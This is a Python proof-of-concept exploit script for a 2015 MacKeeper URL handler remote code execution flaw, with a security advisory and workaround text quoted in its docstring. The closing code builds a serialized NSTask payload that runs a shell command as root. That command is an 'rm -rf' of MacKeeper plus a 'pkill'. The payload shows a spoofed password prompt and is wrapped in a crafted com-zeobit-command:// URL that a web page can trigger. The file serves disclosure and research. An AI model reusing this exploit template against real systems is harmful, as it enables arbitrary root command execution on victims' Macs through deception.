#!/usr/bin/python
"""
SecureMac has released an advisory on a vulnerability discovered today with MacKeeper. The advisory titled MacKeeper URL handler remote code execution vulnerability and proof-of-concept (Zero-Day) contains the latest information including vulnerability, proof of concept and workaround solution, this report will be updated with the latest information: http://www.securemac.com/MacKeeper_Security_Advisory_Revised.php <http://www.securemac.com/MacKeeper_Security_Advisory_Revised.php>

Security Advisory:  MacKeeper URL handler remote code execution vulnerability and proof-of-concept (Zero-Day) Date issued: 05/07/2015

Risk: Critical (for users running MacKeeper)

A vulnerability has been discovered in MacKeeper, a utility program for OS X. MacKeeper was originally created by Ukrainian company ZeoBIT and is now distributed by Kromtech Alliance Corp. A flaw exists in MacKeeper's URL handler implementation that allows arbitrary remote code execution when a user visits a specially crafted webpage.

Security researcher Braden Thomas <https://twitter.com/drspringfield> has discovered a serious flaw in the way MacKeeper handles custom URLs that allows arbitrary commands to be run as root with little to no user interaction required. Mr. Thomas released a proof-of-concept (POC) demonstrating how visiting a specially crafted webpage in Safari causes the affected system to execute arbitrary commands – in this case, to uninstall MacKeeper. This flaw appears to be caused by a lack of input validation by MacKeeper when executing commands using its custom URL scheme.

If MacKeeper has already prompted the user for their password during the normal course of the program's operation, the user will not be prompted for their password prior to the arbitrary command being executed as root. If the user hasn't previously authenticated, they will be prompted to enter their username and password – however, the text that appears for the authentication dialog can be manipulated as part of the exploit and set to anything, so the user might not realize the consequences of this action. At this time it is not known if Mr. Thomas reached out to MacKeeper prior to publication of the vulnerability, but this is likely a zero-day exploit.

Apple allows OS X and iOS apps to define custom URL schemes and register them with the operating system so that other programs know which app should handle the custom URL scheme. Normally, this is used to define a custom communication protocol for sending data or performing a specific action (for example, clicking a telephone number link in iOS will ask if the user wants to dial that number, or clicking an e-mail address link in OS X will open Mail.app and compose a new message to that person). Apple's inter-application programming guide explicitly tells developers to validate the input received from these custom URLs in order to avoid problems related to URL handling. Additionally, Apple has provided information on the importance of input validation in their Secure Coding Guide <https://developer.apple.com/library/ios/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW5>.

Since this is a zero-day vulnerability that exists even in the latest version of MacKeeper (MacKeeper 3.4), it could affect an extremely large number of users, as a recent MacKeeper press release boasts that it has surpassed 20 million downloads worldwide <http://www.prweb.com/releases/2015/03/prweb12579604.htm>. MacKeeper is a controversial program <http://www.pcworld.com/article/2919292/apple-security-program-mackeeper-celebrates-difficult-birthday.html> in the Mac community, with many users voicing complaints about the numerous popups and advertisements they have encountered for MacKeeper. While the POC released by Mr. Thomas is relatively benign, the source code provided with the POC is in the wild and could easily be modified to perform malicious attacks on affected systems.

Workaround/Fix: Until MacKeeper fixes this vulnerability in their program, users can do a few different things to mitigate this threat. On OS X, clicking a link in Safari that uses a custom URL scheme will automatically open the program that is registered to handle that type of URL. Other browsers, such as Google's Chrome browser, will ask the user for permission before opening a link that uses an external protocol. Non-technical users could use a web browser other than Safari, in order to see an alert before a link could cause an arbitrary command to be executed. More technically-inclined users could remove the custom URL scheme handler from MacKeeper's Info.plist file.

Proof-of-concept: https://twitter.com/drspringfield/status/596316000385167361 <https://twitter.com/drspringfield/status/596316000385167361>
This is an initial advisory and will be updated at http://www.securemac.com/MacKeeper_Security_Advisory_Revised.php <http://www.securemac.com/MacKeeper_Security_Advisory_Revised.php> as more information becomes available.
"""

import sys,base64
from Foundation import *
RUN_CMD = "rm -rf /Applications/MacKeeper.app;pkill -9 -a MacKeeper"
d = NSMutableData.data()
a = NSArchiver.alloc().initForWritingWithMutableData_(d)
a.encodeValueOfObjCType_at_("@",NSString.stringWithString_("NSTask"))
a.encodeValueOfObjCType_at_("@",NSDictionary.dictionaryWithObjectsAndKeys_(NSString.stringWithString_("/bin/sh"),"LAUNCH_PATH",NSArray.arrayWithObjects_(NSString.stringWithString_("-c"),NSString.stringWithString_(RUN_CMD),None),"ARGUMENTS",NSString.stringWithString_("Your computer has malware that needs to be removed."),"PROMPT",None))
print "com-zeobit-command:///i/ZBAppController/performActionWithHelperTask:arguments:/"+base64.b64encode(d)